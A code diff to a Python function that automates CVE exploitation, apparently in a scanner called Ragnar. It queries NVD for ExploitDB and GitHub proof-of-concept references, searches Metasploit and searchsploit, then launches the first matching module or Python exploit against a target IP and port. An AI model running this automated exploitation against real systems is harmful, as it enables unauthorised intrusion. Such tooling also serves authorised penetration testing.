@@ -13512,24 +13512,69 @@ def execute_cve_exploit():
             shared_data.ragnarstatustext2 = f'{cve} → {target_ip}'
             broadcast_status_update()
 
+            # Strip CVE- prefix to get the year-number used by MSF/EDB searches
+            cve_num = cve.replace('CVE-', '')   # e.g. "2023-38408"
+
             tried_any = False
             session_opened = False
+            nvd_edb_ids: list = []
+            nvd_poc_urls: list = []
 
-            # ── Metasploit ────────────────────────────────────────────────
+            # ── NVD lookup: find exploit references before attempting ────────
+            try:
+                import requests as _req
+                emit(f'Querying NVD for {cve} exploit references...')
+                nvd_resp = _req.get(
+                    f'https://services.nvd.nist.gov/rest/json/cves/2.0?cveId={cve}',
+                    timeout=8, headers={'User-Agent': 'Ragnar-Security-Scanner/1.0'}
+                )
+                if nvd_resp.status_code == 200:
+                    entries = nvd_resp.json().get('vulnerabilities', [])
+                    if entries:
+                        cve_entry = entries[0].get('cve', {})
+                        for ref in cve_entry.get('references', []):
+                            ref_url = ref.get('url', '')
+                            ref_tags = ref.get('tags', [])
+                            if 'exploit-db.com/exploits/' in ref_url:
+                                eid = ref_url.split('/exploits/')[-1].strip('/')
+                                if eid:
+                                    nvd_edb_ids.append(eid)
+                                    emit(f'NVD reference: ExploitDB #{eid}  →  {ref_url}')
+                            elif 'Exploit' in ref_tags or 'Patch' in ref_tags:
+                                if 'github.com' in ref_url or 'poc' in ref_url.lower():
+                                    nvd_poc_urls.append(ref_url)
+                                    emit(f'NVD PoC reference: {ref_url}')
+                        if not nvd_edb_ids and not nvd_poc_urls:
+                            emit('NVD: no direct exploit references listed for this CVE')
+            except Exception as nvd_err:
+                emit(f'NVD lookup skipped: {nvd_err}', 'warning')
+
+            # ── Metasploit ─────────────────────────────────────────────────
             msf = shutil.which('msfconsole')
             if msf:
                 tried_any = True
-                emit(f'Metasploit found — searching for {cve} modules...')
+                emit(f'Metasploit found — searching for modules (cve:{cve_num})...')
                 try:
+                    # MSF search uses year-number format, not CVE- prefix
+                    search_script = f'search cve:{cve_num} type:exploit; exit'
                     search_out = subprocess.run(
-                        [msf, '-q', '--no-readline', '-x', f'search cve:{cve} type:exploit; exit'],
+                        [msf, '-q', '--no-readline', '-x', search_script],
                         capture_output=True, text=True, timeout=90
                     )
                     raw = search_out.stdout + search_out.stderr
                     modules = _re2.findall(r'\s+(exploit/\S+)\s', raw)
+
+                    # Fallback: also try free-text search with full CVE ID
+                    if not modules:
+                        search_out2 = subprocess.run(
+                            [msf, '-q', '--no-readline', '-x', f'search {cve}; exit'],
+                            capture_output=True, text=True, timeout=60
+                        )
+                        modules = _re2.findall(r'\s+(exploit/\S+)\s', search_out2.stdout + search_out2.stderr)
+
                     if modules:
                         mod = modules[0]
-                        emit(f'Module found: {mod} — launching against {target_ip}:{target_port}', 'warning')
+                        emit(f'Module: {mod} — launching against {target_ip}:{target_port}', 'warning')
                         cmds = (
                             f'use {mod};'
                             f'set RHOSTS {target_ip};'
@@ -13558,11 +13603,15 @@ def execute_cve_exploit():
                 except Exception as msf_err:
                     emit(f'Metasploit error: {msf_err}', 'warning')
 
-            # ── searchsploit / ExploitDB ──────────────────────────────────
+            # ── searchsploit / local ExploitDB ─────────────────────────────
             if not session_opened:
                 ss = shutil.which('searchsploit')
                 if ss:
                     tried_any = True
+                    # Try by CVE first, then by any EDB IDs from NVD
+                    search_terms = [cve] + [f'--id {eid}' for eid in nvd_edb_ids]
+                    found_paths: list = []
+
                     emit(f'Searching local ExploitDB for {cve}...')
                     try:
                         ss_out = subprocess.run(
@@ -13570,40 +13619,63 @@ def execute_cve_exploit():
                         )
                         ss_data = _json.loads(ss_out.stdout or '{}')
                         exploits = ss_data.get('RESULTS_EXPLOIT', [])
-                        if exploits:
-                            for ex in exploits[:5]:
-                                emit(f'  {ex.get("Title","?")}  →  {ex.get("Path","?")}')
-                            first_path = exploits[0].get('Path', '')
-                            if first_path and os.path.exists(first_path):
-                                if first_path.endswith('.py'):
-                                    emit(f'Running Python exploit: {os.path.basename(first_path)}', 'warning')
-                                    py_out = subprocess.run(
-                                        ['python3', first_path, target_ip, target_port],
-                                        capture_output=True, text=True, timeout=30
-                                    )
-                                    for line in (py_out.stdout + py_out.stderr).split('\n'):
-                                        if line.strip():
-                                            emit(line.strip())
-                                else:
-                                    emit(f'Non-Python exploit at {first_path} — copy and run manually')
-                        else:
-                            emit(f'No local ExploitDB entries for {cve}', 'warning')
-                    except (_json.JSONDecodeError, Exception):
+                    except Exception:
+                        exploits = []
+
+                    # Also look up any EDB IDs found via NVD
+                    for eid in nvd_edb_ids:
                         try:
-                            ss_plain = subprocess.run([ss, cve], capture_output=True, text=True, timeout=30)
-                            for line in (ss_plain.stdout + ss_plain.stderr).split('\n'):
-                                if line.strip():
-                                    emit(line.strip())
+                            path_out = subprocess.run(
+                                [ss, '-p', eid], capture_output=True, text=True, timeout=15
+                            )
+                            path_m = _re2.search(r'Path\s*:\s*(.+)', path_out.stdout)
+                            if path_m:
+                                p = path_m.group(1).strip()
+                                if os.path.exists(p) and p not in found_paths:
+                                    found_paths.append(p)
+                                    emit(f'Local ExploitDB file (EDB-{eid}): {p}')
                         except Exception:
                             pass
 
-            # ── Final status ──────────────────────────────────────────────
+                    if exploits:
+                        for ex in exploits[:5]:
+                            emit(f'  {ex.get("Title","?")}  →  {ex.get("Path","?")}')
+                        first_path = exploits[0].get('Path', '')
+                        if first_path and os.path.exists(first_path) and first_path not in found_paths:
+                            found_paths.append(first_path)
+
+                    for expath in found_paths:
+                        if expath.endswith('.py'):
+                            emit(f'Running Python exploit: {os.path.basename(expath)}', 'warning')
+                            try:
+                                py_out = subprocess.run(
+                                    ['python3', expath, target_ip, target_port],
+                                    capture_output=True, text=True, timeout=30
+                                )
+                                for line in (py_out.stdout + py_out.stderr).split('\n'):
+                                    if line.strip():
+                                        emit(line.strip())
+                            except Exception as py_err:
+                                emit(f'Python exploit error: {py_err}', 'warning')
+                        else:
+                            emit(f'Non-Python exploit at {expath} — copy and run manually')
+
+                    if not exploits and not found_paths:
+                        emit(f'No local ExploitDB entries for {cve}', 'warning')
+
+            # ── Surface PoC URLs for manual use ───────────────────────────
+            if nvd_poc_urls and not session_opened:
+                emit('GitHub / external PoC references from NVD:')
+                for url in nvd_poc_urls[:5]:
+                    emit(f'  {url}')
+
+            # ── Final status ───────────────────────────────────────────────
             if session_opened:
                 emit(f'Session opened on {target_ip} — {cve} exploitation succeeded!', 'success', 'complete')
-            elif tried_any:
+            elif tried_any or nvd_edb_ids or nvd_poc_urls:
                 emit(
                     'Exploitation attempt complete — no session obtained. '
-                    'Review log above; you may need to adjust module options manually.',
+                    'Review the output and PoC links above.',
                     'warning', 'complete'
                 )
             else:
